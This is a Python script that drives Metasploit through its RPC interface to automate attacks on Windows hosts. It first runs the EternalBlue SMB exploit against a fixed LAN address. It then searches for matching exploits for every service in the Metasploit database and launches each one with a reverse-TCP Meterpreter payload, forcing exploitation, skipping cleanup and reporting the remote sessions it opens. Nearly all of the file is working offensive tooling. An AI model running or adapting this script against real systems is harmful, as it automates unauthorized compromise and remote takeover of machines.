import socket
import time

import pymetasploit3.msfrpc
from pymetasploit3 import msfrpc
from pymetasploit3.msfconsole import MsfRpcConsole
from pymetasploit3.msfrpc import MsfRpcMethod

from common.utils import start_metasploit


def meterpreter_sid(client):
    s = client.sessions.list
    for sid in s:
        if s[sid]['type'] == 'meterpreter':
            assert int(sid)
            yield sid


def shell_sid(client):
    s = client.sessions.list
    for sid in s:
        if s[sid]['type'] == 'shell':
            assert int(sid)
            yield sid
def run_module_with_output(console, mod, payload=None, run_as_job=False, timeout=301, runoptions=None):
    """
    Execute a module and wait for the returned data

    Mandatory Arguments:
    - mod : the MsfModule object

    Optional Keyword Arguments:
    - payload : the MsfModule object to be used as payload
    """
    options_str = ['use {}/{}'.format(mod.moduletype, mod.modulename)]
    if console.is_busy():
        raise msfrpc.MsfError('Console {} is busy'.format(console.cid))
    console.read()  # clear data buffer
    opts = runoptions.copy()
    # if payload is None:
    #     opts['DisablePayloadHandler'] = True

    # Set module params
    print(opts)
    for k in opts.keys():
        options_str.append('set {} {}'.format(k, opts[k]))

    options_str.append('run -z')
    if run_as_job:
        options_str[-1] += " -j"
    # options_str += "\n"
    print(options_str)
    for option in options_str:
        console.write(option)
        time.sleep(1)
    # console.write(options_str)
    data = ''
    timer = 0
    while data == '' or console.is_busy():
        time.sleep(1)
        data += console.read()['data']
        timer += 1
        if timer > timeout:
            break
    return data

def get_exploits(client):
    """
    Get exploit module
    :param client: client object
    :param module: exploit module
    :return: exploit object
    """
    # exp = client.modules.use('exploit', module)
    # return exp

def exploit_eternalblue(client):
    """
    Exploit eternalblue
    :param client: client object
    :return: client object
    """
    host = client.db.workspaces.workspace('default').hosts.get(address='192.168.86.75')[0]
    exploit = "windows/smb/ms17_010_eternalblue"
    ex = client.modules.use('exploit', exploit)

    runoptions = {}
    if 'RHOSTS' in ex.missing_required:
        runoptions['RHOSTS'] = host['address']
        print(runoptions['RHOSTS'])


    console = client.consoles.console()
    cid = console.cid
    time.sleep(1)

    out = run_module_with_output(console, ex, runoptions=runoptions)
    print(out)  # print output

    while len(client.sessions.list) == 0:
        console.write("sessions -l")
        print(console.read())
        time.sleep(1)

def exploit_hosts(client):
    """
    Get exploits for vulnerable host
    execute exploit
    :param client:
    :param hosts: list of hosts
    :return: list of exploits
    """

    # host = "192.168.86.63"
    # port = "445"

    # ex = client.modules.execute(ex)
    # ex['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp'
    # print(ex['LHOST'])
    # ex['LHOST'] = '192.168.86.64'
    # ex['LPORT'] = 4444

    # cid = client.consoles.console().cid


    success_list = []
    services = client.db.workspaces.workspace('default').services.list
    hosts = client.db.workspaces.workspace('default').hosts.list
    print(hosts)
    for service in services:
        port = service['port']
        print(type(hosts))
        # get the host object where host['address'] == service['host']
        host = next((host for host in hosts if host['address'] == service['host']), None)
        # print(host)
        platform = host['os_name']
        service_name = service['name']
        # if port == 445:

        # else:
        query = f'port:{port} platform:windows type:exploit arch:x64'
        print("Looking for exploits that satisfy: \n\t" + query)
        exploits = client.modules.search(query)
        # print(exploits)
        for exploit_dict in exploits:
            fullname = exploit_dict['fullname'].split("/")
            ex_type = fullname[0]
            exploit = "/".join(fullname[1:])
            try:

                ex = client.modules.use(ex_type, exploit)
                if "windows/x64/meterpreter/reverse_tcp" not in ex.targetpayloads():
                    continue
                elif 'RPORT' in ex.options and port != ex['RPORT']:
                    print("RPORT is not the same as the port of the service")
                    continue
                print("RUNNING EXPLOIT: " + exploit)
                # print(ex.options)
                # print(ex.missing_required)
                # print(ex.required)
                runoptions = {}
                if 'RHOSTS' in ex.missing_required:
                    runoptions['RHOSTS'] = host['address']
                    print(runoptions['RHOSTS'])

                if 'RPORT' in ex.options:
                    runoptions['RPORT'] = port
                    print(runoptions['RPORT'])
                # if 'LHOST' in ex.options:
                runoptions['LHOST'] ='0.0.0.0'
                print(runoptions['LHOST'])
                # if 'LPORT' in ex.options:
                runoptions['LPORT'] = "4444"
                print(runoptions['LPORT'])
                if 'SRVHOST' in ex.options:
                    runoptions['SRVHOST'] = '0.0.0.0'
                    print(runoptions['SRVHOST'])
                if 'SRVPORT' in ex.options:
                    runoptions['SRVPORT'] = "8080"
                    print(runoptions['SRVPORT'])
                if 'ForceExploit' in ex.options:
                    runoptions['ForceExploit'] = 'true'
                    print(runoptions['ForceExploit'])
                if 'AllowNoCleanup' in ex.options:
                    runoptions['AllowNoCleanup'] = 'true'
                    print(runoptions['AllowNoCleanup'])
                print(ex.target)
                if len(ex.targets) > 1 and 'windows' not in str(list(ex.targets.values())[0]).lower():
                    if host['os_name'] in list(ex.targets.values()):
                        ex.target = list(ex.targets.keys())[list(ex.targets.values()).index(host['os_name'])]
                    print(ex.targets)
                    ex.target = int(input("Enter target #: "))
                    print(ex.target)
                # runoptions['CheckModule'] = ex.check()
                runoptions['WORKSPACE'] = 'default'

                runoptions['VERBOSE'] = 'true'
                print("MISSING")
                for o in ex.missing_required:
                    print(o)
                console = client.consoles.console()
                # if 'windows' in ex.targets[ex.target].lower():
                runoptions['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp_allports'
                for o in ex.missing_required:
                    if o not in runoptions.keys():
                        try:
                            runoptions[o] = ex.runoptions[o]
                        except KeyError:
                            pass
                out = run_module_with_output(console, ex, runoptions=runoptions)
                # print(out)  # print output

                print(out)
                print(console.read())

            except Exception as e:
                print(e)
                print(type(e))
                continue
            if client.sessions.list:
                print("Session created")
                success_list.append(exploit)
    return success_list


def main(client):
    try:
        # print(client.modules.exploits)

        # print vulnerability information
        exploit_eternalblue(client)
        succesful_exploits = exploit_hosts(client)

        print(client.sessions.list)
        for console in client.consoles.list:
            print(console)

    except Exception as e:
        return f"Error ({type(e)}): {e}"
    else:
        # gracefully disconnect from db
        return f"Created {len(client.sessions.list)} sessions\n the following exploits were successful: " + "\n\t".join(succesful_exploits)
        # gracefully disconnect from msfrpcd
        # client.logout()
        # return to main
